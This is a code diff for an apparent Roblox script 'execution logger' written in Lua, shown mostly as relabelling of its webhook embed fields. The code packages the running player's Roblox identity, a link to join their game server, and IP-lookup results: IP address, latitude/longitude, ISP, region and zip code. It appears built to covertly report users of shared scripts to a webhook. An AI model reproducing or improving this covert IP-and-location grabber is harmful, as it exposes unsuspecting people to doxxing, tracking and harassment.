@@ -52,7 +52,6 @@ do
                 ["embeds"] = {
                         {
                         ["title"] = "Execution Log",
-                        ["description"] = "Logger for scripts",
                         ['thumbnail'] = {
                             ['url']=string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&UserId=%d&format=png',player.UserId)
                         },
@@ -60,22 +59,20 @@ do
                         ["color"] = 526344,
                         ["fields"] = {
                             {
-                            ["name"] = "User Data",
-                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
+                            ["name"] = "Roblox",
+                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUser: %s\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
-                            ["name"] = "More Info",
-                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region: %s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["name"] = "Personal",
+                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
-                            ["name"] = "Lazarus",
+                            ["name"] = "**Execution Log**",
                             ["url"] = "https://www.roblox.com/users/1684020941/profile",
-                            ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/927388572460412958/download.png"
                         },
                         ["footer"] = {
-                            ["text"] = "Logger/Lazarus",
-                            ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/927388572460412958/download.png"
+                            ["text"] = "**Execution Log",
                         },
                         ["timestamp"] = parseDateTime()
                         }
@@ -126,27 +123,23 @@ do
 
             local webhookJson = {
 
-            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName ,
             ["embeds"] = {
                 {
-                ["title"] = "Lazarus API",
-                ["description"] = "Logger for scripts",
+                ["title"] = "Execution Log",
                 ["url"] = "https://www.roblox.com/users/1684020941/profile",
                 ["color"] = 526344,
                 ["fields"] = {
                     {
-                    ["name"] = "User Data",
+                    ["name"] = "Roblox",
                     ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                     }
                 },
                 ["author"] = {
-                    ["name"] = "Lazarus",
+                    ["name"] = "Execution Log",
                     ["url"] = "https://www.roblox.com/users/1684020941/profile",
-                    ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/926570056689807371/download.jpg"
                 },
                 ["footer"] = {
-                    ["text"] = "Logger/Lazarus",
-                    ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/926570056689807371/download.jpg"
+                    ["text"] = "Execution Log",
                 },
                 ["thumbnail"] = {
                     ["url"] = gameThumb
